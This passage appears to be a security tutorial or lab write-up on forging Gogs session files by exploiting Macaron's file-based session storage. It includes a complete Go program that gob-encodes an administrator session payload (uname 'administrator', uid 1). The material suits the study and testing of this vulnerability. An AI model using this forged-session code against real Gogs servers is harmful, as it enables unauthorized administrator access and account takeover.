Gogs is based on the [Macaron](https://go-macaron.com/) framework. The system used to manage session is very similar to what PHP does. The session identifier in the cookie is mapped to a file on the file system. When the web server receives a request with a session identifier (as a cookie), it looks up for the file on the file system using the following: BASE_PATH+[SESSION_ID]. If the file exists and can be parsed, the information in the local file provides details about the user (for example the user_id).

## Forged user session file
There are two ways to create a malicious session file:
- run your own instance and logging as administrator, then retrieve the file on your server by looking in /data/gogs/data/sessions/.
- build your own tool to generate the malicious file.

To build your own tool, you need to look at the code used by Gogs and more specifically the following files:
- [/vendor/github.com/go-macaron/session/utils.go](https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/vendor/github.com/go-macaron/session/utils.go#L38-L45): for the encoding of the session.
- [/models/user.go](https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/models/user.go#L50-L52): for the types of the user ID and uname.
- [routes/user/auth.go](https://github.com/gogs/gogs/blob/be6bb5314ee7d8ed53362d8e6893b061e5210f48/routes/user/auth.go#L127-L128): for the values to put in the session

By putting together, all the code you need, you should be able to get something similar to the following Go code:
```go
package main
 
import (
  "bytes"
  "encoding/gob"
  "io/ioutil"
  "fmt"
)  
 
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
    gob.Register(v)
  }
  buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}
 
 
func main() {
  var data []byte
  var kv = make(map[interface{}]interface{})
  kv["uname"]= "administrator"
  kv["uid"]= int64(1)
  fmt.Println(kv) 
 
  data, err := EncodeGob(kv);
  if err !=nil { 
    fmt.Println(err)
  }
  ioutil.WriteFile("payload", data, 0644)
 
}
```